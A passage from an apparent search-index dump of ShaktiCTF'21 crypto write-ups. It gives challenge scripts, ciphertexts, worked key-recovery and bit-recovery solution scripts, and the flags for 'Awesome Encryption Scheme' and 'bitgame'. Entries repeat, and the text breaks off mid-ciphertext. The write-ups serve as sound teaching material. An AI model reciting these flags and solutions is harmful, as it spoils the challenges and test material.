of plaintext & ciphertext pair which help in bruteforcing the CFB-key In detail: key2 = [ i for i in keys if bytexor(AES.new(i,AES.MODE_CFB, iv2,segment_size=8*16).encrypt(ct[:16]),ct[16:32]) == pt[16:32] ][0] Now we have the both key1 and key2 , so we can reverse the encryption process to decrypt the ciphertext. In detail: def decrypt(c: bytes, iv1: bytes, iv2: bytes) -> bytes: ciphers = get_ciphers(iv1, iv2) m = c for cipher in ciphers[::-1]: m = b''.join(bytexor(i[16:],cipher.encrypt(i[:16]))+i[:16] for i in [m[i:i+32] for i in range(0,len(m),32)]) return unpad(m,32) Solution Script: from hashlib import md5 from Crypto.Cipher import AES from Crypto.Util.Padding import unpad def bytexor(da,ta): return bytes(i^j for i,j in zip(da,ta)) def get_ciphers(iv1, iv2): return [ AES.new(keys[0], mode=AES.MODE_CBC, iv=iv1), AES.new(keys[1], mode=AES.MODE_CFB, iv=iv2, segment_size=8*16), ] def decrypt(c: bytes, iv1: bytes, iv2: bytes) -> bytes: ciphers = get_ciphers(iv1, iv2) m = c for cipher in ciphers[::-1]: m = b''.join(bytexor(i[16:],cipher.encrypt(i[:16]))+i[:16] for i in [m[i:i+32] for i in range(0,len(m),32)]) return unpad(m,32) (iv1, iv2, ct),pt = (bytes.fromhex(i) for i in open('encrypted','rb').read().strip().decode().split(':')), b'finally now i am able to send my secret with double security and double trust, ' keys = [ md5(bytes([i,j,k])).digest() for i in range(256) for j in range(256) for k in range(256) ] key1 = [ i for i in keys if bytexor(pt[:16],AES.new(i,AES.MODE_CBC,iv1).encrypt(pt[16:32])) == ct[:16] ][0] key2 = [ i for i in keys if bytexor(AES.new(i,AES.MODE_CFB, iv2,segment_size=8*16).encrypt(ct[:16]),ct[16:32]) == pt[16:32] ][0] keys = [ key1, key2] flag = decrypt(ct,iv1,iv2)[79:] print(flag) Flag: shaktictf{Well now I know that it is not an awesome encryption scheme}","title":"Awesome Encryption Scheme"},{"location":"ShaktiCTF21/crypto/AES/#awesome-encryption-scheme","text":"Authored by: Sowmya (@__4lpha__) Challenge Script: from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import md5 from os import urandom from flag import flag keys = [md5(urandom(3)).digest() for _ in range(2)] def bytexor(da,ta): return bytes(i^j for i,j in zip(da,ta)) def get_ciphers(iv1, iv2): return [ AES.new(keys[0], mode=AES.MODE_CBC, iv=iv1), AES.new(keys[1], mode=AES.MODE_CFB, iv=iv2, segment_size=8*16), ] def encrypt(m: bytes, iv1: bytes, iv2: bytes) -> bytes: m = pad(m,32) ciphers = get_ciphers(iv1, iv2) c = m for cipher in ciphers: c = b''.join(i[16:]+bytexor(i[:16],cipher.encrypt(i[16:])) for i in [c[i:i+32] for i in range(0,len(c),32)]) return c plaintext = f'finally now i am able to send my secret with double security and double trust, {flag}'.encode() iv1, iv2 = urandom(16),urandom(16) ciphertext = encrypt(plaintext, iv1, iv2) ciphertext = b\":\".join([x.hex().encode() for x in [iv1, iv2, ciphertext]]) open('encrypted','wb').write(ciphertext) Output: c486732c526c5b60bc29bae6926644eb:5fe355033095d413e601a7ede00fca1d:fd68e8732bb6e9b5672730eb1ed3f2fe9c88b5503e3fb08747ce3dd17296e383ccb76b78587bb1bd1337574073a185e9d846aeab36929d0101e433a34db0cf9ed034abb473a2280624d430c39e58c245603f56a4ddb1127a9f74051481440bbbe53fd95bc8a2a9a3f3488c68d1d9fa8e82cb40dce3df7b2d1c22fca0d05d08c9d197e053586643b32d3dbd4421996ad6abf2a1a930eb16609303471808bac90b This is a customised encryption scheme. So let's take a look at the block diagram to get better understanding of the encryption scheme. Enryption Block Diagram: Message-Block ---------------------------------------------------- | L0 | R0 | ---------------------------------------------------- | | | ------------- | V | | | \u2295 <-------| AES-CBC |<------| | | | | | ------------- | | | | | -------------------------| | \\ | \\ | |---------------------------\\-- | \\ | | V Meet V ---------------------------------------------------- | L1 == R0 | L2 == R1 | ---------------------------------------------------- | | | ------------- | V | | | \u2295 <-------| AES-CFB |<------| | | | | | ------------- | | | | | -------------------------| | \\ | \\ | |---------------------------\\-- | \\ | | V Cipher-Block V ---------------------------------------------------- | L2 | R2 | ---------------------------------------------------- Observation: If we notice the block diagram we can say that the encryption function is using two rounds of fiestal structure * Now we have L1||R1 * Key is a hash of 3 random bytes (can be bruteforced) We can find the key used for AES-CBC by using L0, R0, R1(L2) : * Since R1 = L0 ^ E( R0 ) where E stands for CBC-Encryption -> R1 = L0 ^ E( R0 ) -> R1 ^ L0 = E(R0) -> L2 ^ L0 = E(R0) Now we have a pair of plaintext & ciphertext pair which help in bruteforcing the CBC-key In detail: keys = [ md5(bytes([i,j,k])).digest() for i in range(256) for j in range(256) for k in range(256) ] key1 = [ i for i in keys if bytexor(pt[:16],AES.new(i,AES.MODE_CBC,iv1).encrypt(pt[16:32])) == ct[:16] ][0] We can find the key used for AES-CFB by using L2, R2, L1(R0) : * Since R2 = L1 ^ E( R1 ) where E stands for CBC-Encryption -> R2 = L1 ^ E( R1 ) -> R2 ^ L1 = E( R1 ) -> R2 ^ R0 = E( L2 ) Now we have a pair of plaintext & ciphertext pair which help in bruteforcing the CFB-key In detail: key2 = [ i for i in keys if bytexor(AES.new(i,AES.MODE_CFB, iv2,segment_size=8*16).encrypt(ct[:16]),ct[16:32]) == pt[16:32] ][0] Now we have the both key1 and key2 , so we can reverse the encryption process to decrypt the ciphertext. In detail: def decrypt(c: bytes, iv1: bytes, iv2: bytes) -> bytes: ciphers = get_ciphers(iv1, iv2) m = c for cipher in ciphers[::-1]: m = b''.join(bytexor(i[16:],cipher.encrypt(i[:16]))+i[:16] for i in [m[i:i+32] for i in range(0,len(m),32)]) return unpad(m,32) Solution Script: from hashlib import md5 from Crypto.Cipher import AES from Crypto.Util.Padding import unpad def bytexor(da,ta): return bytes(i^j for i,j in zip(da,ta)) def get_ciphers(iv1, iv2): return [ AES.new(keys[0], mode=AES.MODE_CBC, iv=iv1), AES.new(keys[1], mode=AES.MODE_CFB, iv=iv2, segment_size=8*16), ] def decrypt(c: bytes, iv1: bytes, iv2: bytes) -> bytes: ciphers = get_ciphers(iv1, iv2) m = c for cipher in ciphers[::-1]: m = b''.join(bytexor(i[16:],cipher.encrypt(i[:16]))+i[:16] for i in [m[i:i+32] for i in range(0,len(m),32)]) return unpad(m,32) (iv1, iv2, ct),pt = (bytes.fromhex(i) for i in open('encrypted','rb').read().strip().decode().split(':')), b'finally now i am able to send my secret with double security and double trust, ' keys = [ md5(bytes([i,j,k])).digest() for i in range(256) for j in range(256) for k in range(256) ] key1 = [ i for i in keys if bytexor(pt[:16],AES.new(i,AES.MODE_CBC,iv1).encrypt(pt[16:32])) == ct[:16] ][0] key2 = [ i for i in keys if bytexor(AES.new(i,AES.MODE_CFB, iv2,segment_size=8*16).encrypt(ct[:16]),ct[16:32]) == pt[16:32] ][0] keys = [ key1, key2] flag = decrypt(ct,iv1,iv2)[79:] print(flag) Flag: shaktictf{Well now I know that it is not an awesome encryption scheme}","title":"Awesome Encryption Scheme"},{"location":"ShaktiCTF21/crypto/bitgame/","text":"bitgame Authored by: Sowmya (@__4lph4__) We had a lot of fun conducting ShaktiCTF'21, a CTF conducted to encourage women into Cybersecurity. I created 4 challenges for the CTF and bitgame is one of them. Take a look at the challenge script for better understanding: from Crypto.Util.number import * import random from s3cr3t import flag, key def encrypt(m,pub_key): c = [] bin_msg = bin(bytes_to_long(m))[2:] n,y = key for i in bin_msg: x = random.getrandbits(100) if (i == '1'): c.append((y*pow(x,5,n))%n) else: c.append(pow(x,5,n)) return c ciphertext = encrypt(flag,key) f = open('ciphertext.txt','w') f.write(str(ciphertext)) #n = 839647959743379757835423741637185376972991646369 Output: [42562643920113780314383992973444790297800103805L, 270201072075946607048384842706374179998728033948L, 478696150572049854490380024972284640128204244133L, 192844167117548448623167075616273228287668196099L, 560792841716349679825902951279636180636145238250L, 609530546326083345244017170945258449548367476342L, 489678905487185887435192259665065793157044014172L, 304240005390453372970201668365849620502562510335L, 34740364038564867517367958320046869858974495288L, 354113555109471172653631381634279215113682434527L, 718863418577532883711655093137508949599751843969L, 787596421749282480717164478882637423554132800363L, 60720113008236309010337225519484549198276419459L, 375395201923408015626685085916186403723767481219L, 244943660867068328293332017974114669754460799950L, 245254377618599246752522270541215491846475305056L, 705460977796046179251314443682157178194595868596L, 643564235377169835300277024686733201282999002078L, 234607559505017773285254958409145178128337317081L, 262106729400567007422999522515963227780820148794L, 796797538124170595443577280466338638337631051917L, 671130571689483222411468470907489116985896909864L, 435111105901247188918896477824036572714870144108L, 188738259458513713348227390570323255976501894794L, 403664278827800051458795932069381383638039896912L, 450453923787928667025727490997218612598163453172L, 292277050504697818600132645594451578176163553728L, 396712586707424551591625597013523562315708771732L, 828540331627768530081785707127746956851775797537L, 306245019282101610448248764660903691388195345864L, 453025904791949452652850242819131133647931405938L, 498455466273080906354302937504490578475529510082L, 433859840721423539828281915899012036045501867638L, 4112471994028549942990159234057290220962191206L, 40112171061753634650048019681832930104362512193L, 506994066996892736157621420878132367834271023830L, 475973938071686707005969066843962965834158462383L, 483148946026593897799105539179028487395599456125L, 505268286307742621241742122018316818130514068358L, 51084013105707653358881704299907347959419162099L, 156674192162499653792974439867787206150121955892L, 116222523117951616298553926526606512146234488558L, 198838985683958200338238715473735852845718594403L, 552761077482623886613362536729637129504340314588L, 691926839330848205914573034974680099885594312359L, 533225574397822744447709196006479643432782746132L, 525069593329907206227192936432787959213477895494L, 574434273131566696574031958682215241461817125675L, 22971482101603880003567523316999669428901594086L, 415902134749361763242694778914875182215876697014L, 25481189327724499974328202975928332596342482407L, 806409749653502047630656641071162097281916027498L, 782739495150953778138488122166759366800784360878L, 94442051895289674789756899148894174046327631694L, 181641734203744708199456825173176266657123499807L, 60840903772324788098969124246794065320421213489L, 758393667796245465564567697624752663960576338728L, 6732911589183806346242718430982000627359130546L, 526538853135361065790441199485744413547707833102L, 13169452418822757462382920069838895938834788489L, 354264551159526034092752020219986483886957780091L, 763890973234725549738759266042572524218572268810L, 38915197197467524140953521263519944044015816676L, 356729012185507572094124074404303992692960763662L, 688935160710822672149080065664003093627178172074L, 390707470673135988461324074539218350756156234227L, 643234399905301583207285640240861813157651912695L, 206486526451835857688148677537562010548613380728L, 412547682212845496249004990275045182157219784000L, 586596463924160298483539472734795046471312794377L, 823573710837339354159625221299350410322401031709L, 699415995387530485085379798687393364287430406678L, 229385472079591809731148776566046688850677865912L, 409187618776725025866556179970352023362870372981L, 565122935290827580047237319222947875107451892822L, 793960543895031567094887608104418228949148881782L, 248282613526546833813841779078781073671096554161L, 184625905682457611988574304326798360600935828292L, 249163376695223358078209809278132837343403736414L, 346219945773967908894466481689718840158451686171L, 125348572697162313378337216926744739368205933652L, 360161339422686830433742299840394126403855057498L, 820661186304406524137071718374718559430977131504L, 271328514751805078696506404052237370921945990789L, 578924550192732328970864220370650951989184910362L, 790366482676934429301484856038963393930365397141L, 13174384137976706063457146620593936919423653154L, 669527535219694225761460923054950626237559513069L, 795644006931466412438436027675956386865843883078L, 94816506075556532038226354119900444345379903775L, 744956981517249057360969148911275811544442845027L, 559762794928370765077648338368130266624300230271L, 380155757610023881313542450314806157673664799112L, 19683776564375453605883964654879957698756254559L, 43383584999406070429416277350085499394109459126L, 144387263230719600281316819853134788477784762083L, 87949768501179906441288780703259946463864030018L, 431209645604478415485941369102530566991524490369L, 726222229627274684880162339685366010699968344905L, 112406592095148269917120485235753022005744988865L, 697437757471364977176040689280612791646014582160L, 288303739609623663737993183334403780500224944503L, 371441671537548617833261377684573395637718098377L, 73503179213393913023704937289223113070710436178L, 14278600014834517753559474524037832942635927659L, 95979312957862956641244586033112513755803077444L, 123611849060591463856666997035364759427112812349L, 250267505390780054373759212573794114332304420897L, 274331340187983766414970375369314382470309923528L, 530954278326398757599110590629998236194873705738L, 445063803639254844602118928332995402727991005526L, 477536316882356739806381795009989191971022494775L, 145806534277604580875808969952673951890456430994L, 338617094019005929131671762676393196161129291273L, 787986998792470243821397305866328174678704601832L, 797681956485293402755781130144373911193743174116L, 102568133699310747724426519505517138297342928702L, 485973235220253658819163335922664305614753222737L, 708864866282153909934399948843210933312918475225L, 308869644059764204860466118240550021785346378407L, 265134597784188972044817186771092475529959115280L, 658630862233825651846758771232193854753199783323L, 410299892119423701050427477155381392726923211285L, 6310556712134526086449137092667549852236480664L, 721490244153294996049060382571833870041784134677L, 189255620808066245253673434834382588149476325354L, 656660321216535035554868867584817446419376547800L, 227454614460719041137689443422767765867650838496L, 564044834979679073000283863743361202562615780677L, 819497725880056350642396338505462063661613081114L, 221608084786562734221253860081125113787049343286L, 65545019154510438233732307194863607751031185596L, 501764965357482269727888050687089193157839203155L, 12596049711442079696416208815415678242091492882L, 608335000655435283873776788164729624608624817344L, 769164412496263133567276017296030606229830101938L, 664392246067357098877579195261219487179986160723L, 75996028618380983622275289805057198859844565452L, 672253925254041921269524864028282672756772077887L, 10895374234330584911367787251440628566929185900L, 142938310359303082468235486875054184138048896491L, 580034759791051467570186991460531038900679165541L, 287969775416861410657459226277133443501613853261L, 283979020686970117242427425329619893769855354427L, 49347852309409910369201393348291141557656286601L, 624150486700256698789404049401551672419608893976L, 454233579238810112360216789636690941906069484L, 690476396562361518729054252655764072124449268089L, 364952245729150423326049996389508037748559889683L, 46898493332148283155094923745254689993163426686L, 721357617282368645994984755385188516191333854333L, 668358240156477324515019332670949254186522240400L, 530146560534258049207674282686131830473272127904L, 421240386903585887479293913607895739401770216131L, 131544157730297580532376112097192541317179941259L, 53769876913560242076228652083351431136553941165L, 324630132786079151774454244099857497319443044190L, 55914569733303855249647496460820458501426747612L, 356460015927961571935862199999992385930644898065L, 381970962369842965489276922281370450755149773458L, 377925988386382827724043815986127076122697666178L, 170391875451406681354914296500571079580495228122L, 500412216700342254882222529341044797546002378807L, 270482626136675206071126080144589222444978935258L, 510204515848361838813066544104229196649427634721L, 694801815446371547162777895975222045949858069418L, 739395372540171364253886631013817491306399454241L, 188905973397720824340314521621708188756348481623L, 487870658355564402820834450621197405413234278639L, 319933909357132234363354760423492914423939767405L, 263703052554121451143337156067968794709832976406L, 570885622346973806312331572767432345815012650994L, 613648216706507119609753855305736669966565489982L, 362055399017830857419118173194209585364129442109L, 464810998911591121288542168872550032794798575825L, 196427036821223400365200413058345761514591417071L, 25628609184402392719234409827173411591973261458L, 389660521648409036834014768969265025739038255604L, 384795004021400423555640099529367625348372390881L, 707289989717621963077194153935371259310016146498L, 670156226011236402401031750316704325477772529598L, 629478318010023990541972179492930924715945763382L, 420764775998999021307498556733386932841231547252L, 251295036637272900755099390296951302668662082535L, 169181615309865901082109507073231110967263343231L, 727702942882742898038421109217524091767497663579L, 83024833885016173065293040667506410015938527209L, 590299697981360913335337981554769685232278816484L, 839249169584760629344409812254395370637808942355L, 2532976737131698067709154159037178901016309877L, 827937908618358796220690459011146862691362111002L, 207856757362656702785928558342235732619155859448L, 769440512853837881195823544868309771285163168637L, 150792348186937950818307794770276348445131352633L, 406447664606606744239239241303236797113232638462L, 684929378565763960066686307141328078651822393408L, 224654949657621819479575791369530594184155735377L, 359668158337346821455429069306126150792495076312L, 426060019926904837328971794380434549817610220732L, 505900793827530726062521493253102791728579635544L, 574338323217068317021970616387654890577373082437L, 488642086812332277755648129901622844016014181036L, 782798139277588726443102861877502720631068154149L, 324941005837173666916146304702575016292154648894L, 599252796763371419729714377145026171271223602258L, 288626676593421098489763933781298880420148163084L, 467935558547944283971065855963398198551871488940L, 761714358296754159904539604281904852153669298518L, 276446988966064634125865380166049029609802351898L, 369023293814293814154164274667350587946664894323L, 717575431771607488393572799869825518074253493155L, 118574849771069306281658344868625779723252233598L, 12370452420955837433680686183877312882669690356L, 302301431161391687343955867699420163562587859945L, 195371671757690146983317782756160228746356628053L, 398747732493308984681571661499786666875939301584L, 698066685291591126425888078294753343383201876605L, 740615239592232339016993695884773933922478083470L, 106890365483452085129238401357149755728096568181L, 675424749894236876558905109629365681327887392939L, 201302679654677994076085404830210315546203833631L, 44180267617276864922134072223207783121823083760L, 124456735968311732522942481244765035866893530651L, 417097239834755904408684513793979044196227705274L, 233788505090359270398498540249276534994456393509L, 784883544295792169888524547442249976612414385390L, 263927032662315532641804497592590261948623275544L, 230408128635809022368695431658123209759525446197L, 828438163544123004635226007093619116738969501455L, 131177833362897071821531267320249645985720757061L, 282559114644612791250228142178864990076027445349L, 51535753100637770749762754865965551911906842650L, 75639553057595587596260623277885037750125179263L, 58473575929726038902167525004493155853338472174L, 644200156245117800830127150551293667263711884010L, 59336566770535954402402035001334688195109558183L, 325545043540004593614133895407411121346920176287L, 386730240555902975565127557492240699320716883276L, 107832757107482266991355321046790326277959386133L, 828353615833264639624534978723116154197590072611L, 437040243883858950708846625114604220964420978147L, 803398029066860857025331241486964965031131551855L, 576964537171426515123456361528143227570520116021L, 809583738378871906451344170063186991235371039023L, 823305093786540109619869220762083224118345164231L, 411621562624640152400201282326942360790677410663L, 231940523067486950068748404474658124358585742451L, 604140702068928167426636914613216363264491139925L, 182549530248750772516328059170083331367736115014L, 351272332765569839425323248007300819393087347081L, 808051965718020879122522501107824643411794084717L, 435313223797686028005157782836052182346489443562L, 773290097747317561689672554732697061093259735422L, 494807743119295726369579141007071491416325582655L, 374920928368387309057243128392752000439621200886L, 20308207759197365626061325015796899552114404367L, 219468272654429509419082815650800497195671108828L, 81139930848333886667752156803811140821451629059L, 569841453048534459795682040530849453115831698992L, 219815172001382756213076518296618693861215663555L, 315228832309928783802974983540753584930582247996L, 521351457638018908013070218723655643353193350239L, 837078355322582540009573068258668145024145790857L, 305949280410779965167795125684763760979096567656L, 752734535504843782529733381847990120498024803199L, 130979635848607595450001756874180120833056339272L, 127380462105684333862449267491349897546937670062L, 831464164576028236819157664155629321588853884506L, 458553646896923021292508986645409497433444903480L, 331547581789456197823262914448841887743389126588L, 687438850344432414366519941161325929797010982058L, 46814190784385113831609191671871870377062343969L, 367204250911005382086630700883675824898695572800L, 837950709225208622477048636848957743414279375406L, 755979086689398053301176627949234797669290978111L, 463929034563763591426239863240035335944307807918L, 388056079877348208051659258366423130180840108779L, 481802465454467461901032139782822670524640782774L, 701079443559078618728078108282845476374731501563L, 334745542222185197153180834408788144100538013756L, 253145560380270643162860828610515679311935720072L, 395630118318640218770711387893972244901063806635L, 208106342863019937023658673932614122363417212569L, 800934699010135610598225595151405276781918908874L, 696336112960889233518724992191716194527976985507L, 300286054927681941643313635323094504882574668063L, 458789329000502799100156566567758633503913820978L, 708175590579955723202930994812768283855064465047L, 587984734773590846183205937392451653174439236906L, 823762034931564176090815640023005894001280083927L, 524050296443714423381097945460586696978946512362L, 826146010460282803089280095111726046618296418403L, 738059115420803411392019151234924442822894137372L, 785923027603124246693527973036116119960741214026L, 252991902280292538077710740416727662292106903638L, 612730418549786530304086962840101299076730718334L, 69668983448626635123547735831825182040773807879L, 739161334792019562944848789255480347264595497250L, 426088326883952707470818191951397422806811512699L, 609894411725117311887748173369827266668614691266L, 165292756235797442318361854602140226544694739311L, 589667800107858677593289168022975113313550682848L, 640857564932560426034113458302923984027810983424L, 433295904246129548439611855874554726964056196739L, 295736828268442704674230280994652730936476162079L, 362750821004685893453136326523511170789437995781L, 589336117631319830914706810245178694288089137894L, 811399758747533046016039717227711274741061322838L, 27580861145202333471323495462147840357753419133L, 470227706417198698085667542317817787181959330535L, 584323275788057749480505550524460240732635160625L, 237827904233525417474165042101078126135986675291L, 185838249618402980174158400553291130995482918982L, 716717904900153456374864913024565035802728872046L, 299928293393029561935406197987330775735773835320L, 610584168172650199159224372380373439956634978704L, 690408099401618105598728398222166520124608190031L, 283306897206518288330461379029998212937266204548L, 817789019703352399202811822660012332372841442630L, 220127609791912011108106028754496869303560001849L, 246504269062014401534735358881601032162158759689L, 46082991319083955224175960690398710532164487906L, 212751399833511915627540175127168811177001660515L, 385250717564324096772476620548142926475688319557L, 61365581213548006550836975224755122334454850567L, 500463428035823554224310567250695080325995136096L, 61899143940365444140145428783315450062301530480L, 203025377470260666449657924180136421473514357156L, 123908476681846473673931773788947788317808065213L, 195215144275960912638932735284434043560100707418L, 133310257625037249927206630090100662665907910449L, 276367955374261543252723006408725695641217591135L, 663820798437396723050278496454824751706073882376L, 627376994406926072818386443662506537498856251729L, 807263912057381638138372982429348018327576023228L, 818554198814274015966753870605601199174333968563L, 529245620163810217622982543182351257311767464391L, 546398992629494812601212735149228626834119169658L, 788234766026477342751189473804919448998384347820L, 167271976519951808827353512125697808810338462380L, 430534784945777772222546078201421648977639348392L, 566978025835009408463135989978297395594607030631L, 727029425844280750981029116965799959144058594190L, 448139533138455217978527391597808802026293321469L, 151729712152759812390167470675728297857929105951L, 657791674324077339300884249739164923180072401180L, 424404948439217017610243837136383380191856871586L, 455777852150250746502732696760882431897002125490L, 118395806165479611207400242952156754708902219616L, 651998890970295878824168089404549122037582504955L, 318053786402730632110007904507392367956281607521L, 89256996994847882782731727353769430635891555271L, 191640633961245854939398057878203554179178922625L, 776093243824038694002940702752259227273873370266L, 604808053552832309560700585581226890424168461228L, 696457148711375718900956512475692076017562220382L, 225740711410466953926721086553814924866335860229L, 779384895686875556285208428413344125970531184120L, 80036196428413356900967644789298317424533638010L, 822496368697611448419908595847938425766407310386L, 834931499492006898642424172352707198872177553902L, 698414105277227047734122275193896168604649888702L, 529758554002809089081465457150468189507830589413L, 717258925424201058322126193594043182379350820121L, 545320778959010102117304312285631032420173177586L, 198810957950627600434822289656001469986862095348L, 396686025175354098156566844871532163846424230341L, 695402937231760183954791141361421552844300447983L, 616359789228266349699343794021003938187153822056L, 605577098887398262759634549331644256082166532624L, 601338707988632159208727568593686398013820974578L, 602334758345704224480697812073862084189082659829L, 199993895840217594422160437717413997273424537729L, 301172881601039569961892167965346000465469196938L, 270479627692150358469747722957892647453928511135L, 326335212710487507108472271822639699064648093691L, 106777921739243304370773085119576780949295942475L, 167071874552627084471353729657264563338026693956L, 197386913819707750998548688666241780705209642981L, 333989154944272765126437456969009498043248355518L, 434050250540343912275467215058298016032888176906L, 725401040393076792082841393446779306613460301273L, 727195206457435913302519991149583073712130944332L, 71590043050251237974379603651300783856190315391L, 793139264226788841507794442559678297202409093836L, 378525088022847526633162652098970409025974176857L, 64801404877308530110643631000410492805816851806L, 643972961663258149439837603423804897541649156072L, 157478292833194737519619595267874394324268309984L, 134041615706387295807480733390897871749463349268L, 461258613878623602622274059869770203247750228227L, 625872418231109115583561800171823884770612992316L, 237401566421194941434761956019939328673784029053L, 352405224268011659966413741974587740202212965590L, 116884396815801319245874245933296320636289143041L, 283195867540544834172532403440934521697373549015L, 689140484289234758370348531544928691906949176271L, 193196143026619464739760509606724898405753196236L, 67085710038260071732180539591066081368573964447L, 791794421731500760432508508849445876352096030071L, 432475128267108313460692996087695700599634295795L, 685073149783887985113269353340454247763263219124L, 335833908379012325847781848040473707739024530929L, 220612931303802409528417426553183475490460728373L, 291854819805074338140207394148645955031098744378L, 714515251507395673121930785122395634981321413798L, 724693143577584941911193410692637232099404458917L, 611243364076247112840263509691315114388391971369L, 229795860797995375715782537388782018888177477019L, 296341917462921514026327489596409707263895273191L, 309740425030881907897587814686626624055404447246L, 671631272527133996290893591609221360527257103885L, 218905811821960994832449103806857649781424376178L, 429772382896991457674660590568850053767362874075L, 250175727687874743892420590416583480995866963574L, 220396487416821216308222497372918137375558487785L, 248632603454655733234736595964105946950230116916L, 227496926861674027230311767436572791705586083714L, 519824104424885904393303337198605448578756909808L, 795103589371838503191297936262867047859443076904L, 244542828172213041199894799012547508435456165435L, 50052840614934527554894507145108176434868736721L, 539864968707154388655261925196382978215459738283L, 273582666961051735607824388845532732241288761719L, 531514886312313973773063924153516924192418657044L, 101484196383889500114457151515690119406749520478L, 404547795626034292311498435162286213193191412452L, 250171257240814875397420693184875445138996688633L, 211239841284623887225478944285253370693514862872L, 33702581727268200448000963472643896415286212021L, 727954030308555513888383002365701074524660686267L, 296372634680510180045698528854832499158025138767L, 103639178450743820451116640692980921644914754181L, 381056138816946574321553076345557659912184128071L, 220363775860108926430412133120609969043172885719L, 828380089804826191248904060499310291984337292267L, 240818837128375459115613365004393187326689178106L, 599714327776873507299886356592570412302353344127L, 514039904560736346483340269688580936191901954975L, 838405528426499141475985982949569190893885957871L, 67178744880390923276819786579857611880328181620L, 821336351518183360948635849459228489892497850605L, 465122017037822859400169939428274438908366165072L, 95264823246420773240792527458136208743710928871L, 158144519740001444337707734860202573635872827543L, 689985808396255471137327738486051869204812470986L, 550134662580703482270292485064392354509835320583L] Each bit is encrypted using unknown numbers, except the modulus. But, on checking the modulus, one can find that it is factorizable . Next step is to question if one can find which bit is being encrypted. For that, we need to check: pow(ct[i],phin//5,n) == 1 #this tells that the bit encrypted is 0 else 1 Solution Script: from Crypto.Util.number import * n = 839647959743379757835423741637185376972991646369 p,q = 716158806799958648435521, 1172432638921544069685089 f = open('ciphertext.txt').read() L = eval(f) #FYI: This is a dangerous function :P pt = \"\" for i in L: phi = (p-1)*(q-1) d = (phi*inverse(5,n))%n if (pow(i,d,n) == 1): pt = pt + '0' else: pt = pt + '1' print long_to_bytes(int(pt,2)) Flag: shaktictf{Awesome!!YouAreANumberTheoryExpert!!KeepGoing}","title":"bitgame"},{"location":"ShaktiCTF21/crypto/bitgame/#bitgame","text":"Authored by: Sowmya (@__4lph4__) We had a lot of fun conducting ShaktiCTF'21, a CTF conducted to encourage women into Cybersecurity. I created 4 challenges for the CTF and bitgame is one of them. Take a look at the challenge script for better understanding: from Crypto.Util.number import * import random from s3cr3t import flag, key def encrypt(m,pub_key): c = [] bin_msg = bin(bytes_to_long(m))[2:] n,y = key for i in bin_msg: x = random.getrandbits(100) if (i == '1'): c.append((y*pow(x,5,n))%n) else: c.append(pow(x,5,n)) return c ciphertext = encrypt(flag,key) f = open('ciphertext.txt','w') f.write(str(ciphertext)) #n = 839647959743379757835423741637185376972991646369 Output: [42562643920113780314383992973444790297800103805L, 270201072075946607048384842706374179998728033948L, 478696150572049854490380024972284640128204244133L, 192844167117548448623167075616273228287668196099L, 560792841716349679825902951279636180636145238250L, 609530546326083345244017170945258449548367476342L, 489678905487185887435192259665065793157044014172L, 304240005390453372970201668365849620502562510335L, 34740364038564867517367958320046869858974495288L, 354113555109471172653631381634279215113682434527L, 718863418577532883711655093137508949599751843969L, 787596421749282480717164478882637423554132800363L, 60720113008236309010337225519484549198276419459L, 375395201923408015626685085916186403723767481219L, 244943660867068328293332017974114669754460799950L, 245254377618599246752522270541215491846475305056L, 705460977796046179251314443682157178194595868596L, 643564235377169835300277024686733201282999002078L, 234607559505017773285254958409145178128337317081L, 262106729400567007422999522515963227780820148794L, 796797538124170595443577280466338638337631051917L, 671130571689483222411468470907489116985896909864L, 435111105901247188918896477824036572714870144108L, 188738259458513713348227390570323255976501894794L, 403664278827800051458795932069381383638039896912L, 450453923787928667025727490997218612598163453172L, 292277050504697818600132645594451578176163553728L, 396712586707424551591625597013523562315708771732L, 828540331627768530081785707127746956851775797537L, 306245019282101610448248764660903691388195345864L, 453025904791949452652850242819131133647931405938L, 498455466273080906354302937504490578475529510082L, 433859840721423539828281915899012036045501867638L, 4112471994028549942990159234057290220962191206L, 40112171061753634650048019681832930104362512193L, 506994066996892736157621420878132367834271023830L, 475973938071686707005969066843962965834158462383L, 483148946026593897799105539179028487395599456125L, 505268286307742621241742122018316818130514068358L, 51084013105707653358881704299907347959419162099L, 156674192162499653792974439867787206150121955892L, 116222523117951616298553926526606512146234488558L, 198838985683958200338238715473735852845718594403L, 552761077482623886613362536729637129504340314588L, 691926839330848205914573034974680099885594312359L, 533225574397822744447709196006479643432782746132L, 525069593329907206227192936432787959213477895494L, 574434273131566696574031958682215241461817125675L, 22971482101603880003567523316999669428901594086L, 415902134749361763242694778914875182215876697014L, 25481189327724499974328202975928332596342482407L, 806409749653502047630656641071162097281916027498L, 782739495150953778138488122166759366800784360878L, 94442051895289674789756899148894174046327631694L, 181641734203744708199456825173176266657123499807L, 60840903772324788098969124246794065320421213489L, 758393667796245465564567697624752663960576338728L, 6732911589183806346242718430982000627359130546L, 526538853135361065790441199485744413547707833102L, 13169452418822757462382920069838895938834788489L, 354264551159526034092752020219986483886957780091L, 763890973234725549738759266042572524218572268810L, 38915197197467524140953521263519944044015816676L, 356729012185507572094124074404303992692960763662L, 688935160710822672149080065664003093627178172074L, 390707470673135988461324074539218350756156234227L, 643234399905301583207285640240861813157651912695L, 206486526451835857688148677537562010548613380728L, 412547682212845496249004990275045182157219784000L, 586596463924160298483539472734795046471312794377L, 823573710837339354159625221299350410322401031709L, 699415995387530485085379798687393364287430406678L, 229385472079591809731148776566046688850677865912L, 409187618776725025866556179970352023362870372981L, 565122935290827580047237319222947875107451892822L, 793960543895031567094887608104418228949148881782L, 248282613526546833813841779078781073671096554161L, 184625905682457611988574304326798360600935828292L, 249163376695223358078209809278132837343403736414L, 346219945773967908894466481689718840158451686171L, 125348572697162313378337216926744739368205933652L, 360161339422686830433742299840394126403855057498L, 820661186304406524137071718374718559430977131504L, 271328514751805078696506404052237370921945990789L, 578924550192732328970864220370650951989184910362L, 790366482676934429301484856038963393930365397141L, 13174384137976706063457146620593936919423653154L, 669527535219694225761460923054950626237559513069L, 795644006931466412438436027675956386865843883078L, 94816506075556532038226354119900444345379903775L, 744956981517249057360969148911275811544442845027L, 559762794928370765077648338368130266624300230271L, 380155757610023881313542450314806157673664799112L, 19683776564375453605883964654879957698756254559L, 43383584999406070429416277350085499394109459126L, 144387263230719600281316819853134788477784762083L, 87949768501179906441288780703259946463864030018L, 431209645604478415485941369102530566991524490369L, 726222229627274684880162339685366010699968344905L, 112406592095148269917120485235753022005744988865L, 697437757471364977176040689280612791646014582160L, 288303739609623663737993183334403780500224944503L, 